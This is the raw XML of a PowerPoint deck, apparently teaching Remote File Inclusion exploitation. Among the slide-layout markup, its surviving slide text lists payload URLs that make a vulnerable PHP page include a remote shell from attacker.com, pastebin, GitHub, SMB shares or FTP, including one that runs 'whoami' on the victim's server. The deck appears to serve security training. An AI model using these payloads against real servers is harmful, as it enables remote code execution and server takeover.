          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="869990" y="5234583"/>
            <a:ext cx="6259473" cy="584240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5020"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1065490" y="5381149"/>
            <a:ext cx="5868472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483531"/>
            <a:ext cx="6630948" cy="7820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10701" y="4434007"/>
            <a:ext cx="398145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STEP 2: INCLUDE REMOTE FILE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7510701" y="4929068"/>
            <a:ext cx="6239947" cy="1457563"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2012"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7500938" y="4929068"/>
            <a:ext cx="6259473" cy="1457563"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2012"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7696438" y="5075634"/>
            <a:ext cx="5868472" cy="1164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http://example.com/page.php?page=http://attacker.com/shell.php&amp;cmd=whoami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Result: Executes 'whoami' on victim's server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84252" y="6771680"/>
            <a:ext cx="13261896" cy="72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Impact:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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The attacker gains complete control over the vulnerable server by executing arbitrary commands through the remotely included malicious PHP file.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5.3 RFI EXPLOITATION TECHNIQUES</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4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700326"/>
            <a:ext cx="9621679" cy="52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TECHNIQUE 1: DIRECT REMOTE INCLUSION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32711" y="1610201"/>
            <a:ext cx="13164979" cy="2891314"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1086"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="722352" y="1610201"/>
            <a:ext cx="13185696" cy="2891314"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1086"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="931664" y="1767126"/>
            <a:ext cx="12767072" cy="257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Include remote PHP shell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http://example.com/index.php?file=http://attacker.com/shell.php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Include from pastebin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http://example.com/index.php?file=https://pastebin.com/raw/abc123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Include from GitHub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http://example.com/index.php?file=https://raw.githubusercontent.com/attacker/repo/main/shell.php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2711" y="4791313"/>
            <a:ext cx="11369873" cy="52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TECHNIQUE 2: SMB SHARE INCLUSION (WINDOWS)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="732711" y="5604510"/>
            <a:ext cx="13164979" cy="1924764"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1632"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="722352" y="5604510"/>
            <a:ext cx="13185696" cy="1924764"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1632"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="931664" y="5761434"/>
            <a:ext cx="12767072" cy="161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Include from SMB share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http://example.com/index.php?file=\\\\attacker.com\\share\\shell.php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UNC path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http://example.com/index.php?file=//attacker.com/share/shell.php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7221"/>
            <a:ext cx="743307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TECHNIQUE 3: FTP INCLUSION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547824"/>
            <a:ext cx="13042821" cy="2154555"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1579"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="782479" y="3547824"/>
            <a:ext cx="13065443" cy="2154555"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1579"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1009293" y="3717846"/>
            <a:ext cx="126118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from FTP server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http://example.com/index.php?file=ftp://attacker.com/shell.php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credentials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http://example.com/index.php?file=ftp://user:pass@att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2349</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Custom</PresentationFormat>
  <Paragraphs>270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Hubot Sans Bold</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Roboto Condensed</vt:lpstr>
      <vt:lpstr>Consolas</vt:lpstr>
      <vt:lpstr>Hubot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4</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-02-05T10:03:25Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-02-05T10:26:07Z</dcterms:modified>
</cp:coreProperties>
</file>